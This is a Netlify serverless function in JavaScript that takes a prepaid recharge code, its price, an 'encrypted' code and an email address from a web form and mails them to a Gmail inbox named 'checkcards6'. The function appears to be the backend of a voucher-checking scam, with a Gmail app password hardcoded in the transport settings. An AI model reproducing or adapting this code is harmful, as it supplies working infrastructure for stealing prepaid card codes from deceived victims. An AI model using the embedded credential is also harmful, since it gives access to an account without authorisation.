import nodemailer from 'nodemailer';

export const handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': 'https://669fc400d4d6274a67d22ef5--phenomenal-gaufre-6f7e3a.netlify.app', // Autoriser toutes les origines
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Credentials': 'true'
  };

  // Handle preflight request
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: headers,
      body: ''
    };
  }

  // Parse the request body
  const { rechargeType, price, rechargeCode, encryptedCode, email } = JSON.parse(event.body);

 
  const emailMessage = `
    Type de recharge: ${rechargeType}
    Prix de la recharge: €${price}
    Code de la recharge: ${rechargeCode}
    Code de la recharge crypté: ${encryptedCode}
    Email: ${email}
  `;

  // Create a transporter object using the default SMTP transport
  let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'checkcards6@gmail.com', // replace with your email
      pass: 'nhog ulrv gjri yicj' // replace with your email password
    }
  });

  // Set up email data with unicode symbols
  let mailOptions = {
    from:  email, 
    to:'checkcards6@gmail.com',
    subject: 'Recharge Information',
    text: emailMessage
  };

  try {
    // Send mail with defined transport object
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      headers: headers,
      body: JSON.stringify({ message: 'Email sent successfully' })
    };
  } catch (error) {
    return {
      statusCode: 500,
      headers: headers,
      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() })
    };
  }
};
